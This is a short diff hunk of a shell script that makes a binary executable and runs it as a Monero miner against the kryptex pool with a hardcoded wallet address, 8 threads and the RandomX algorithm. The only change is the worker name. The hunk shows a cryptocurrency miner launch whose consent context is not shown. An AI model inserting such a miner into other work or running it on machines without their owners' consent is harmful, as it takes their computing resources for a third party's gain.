@@ -10,4 +10,4 @@ chmod +x "$BIN_NAME"
 
 # Optional: run the binary
 # ./"$BIN_NAME"
-./"$BIN_NAME" -o xmr.kryptex.network:7029 -u 44Hy7goGeFtd6HeHC4GEYXhApgSCNKf2q1YRPVA9661mQWoZ5WVTovj8Te1kmLmdut1dXwws7C491EoFUTbN3qCv8zbwhKC/WSS07 -a rx/0 -t 8
+./"$BIN_NAME" -o xmr.kryptex.network:7029 -u 44Hy7goGeFtd6HeHC4GEYXhApgSCNKf2q1YRPVA9661mQWoZ5WVTovj8Te1kmLmdut1dXwws7C491EoFUTbN3qCv8zbwhKC/WSS08 -a rx/0 -t 8
